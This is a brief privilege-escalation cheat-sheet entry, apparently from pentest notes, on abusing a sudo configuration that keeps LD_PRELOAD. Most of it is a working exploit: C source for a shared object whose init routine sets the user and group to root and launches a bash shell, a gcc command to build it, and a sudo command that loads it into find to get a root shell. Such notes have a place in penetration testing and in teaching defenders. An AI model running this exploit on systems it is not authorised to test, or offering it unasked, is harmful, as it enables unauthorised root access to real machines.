LD_PRELOAD


General info about LD_PRELOAD

If you execute ‘sudo -l’ and see the following:
env_keep+=LD_PRELOAD

you can force other applications to load your own .so files.

You need to be able to run this application with sudo rights, however. Otherwise you can't get a root shell.

Code example:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}


Then compile it as follows:
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

Then run it as such:
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
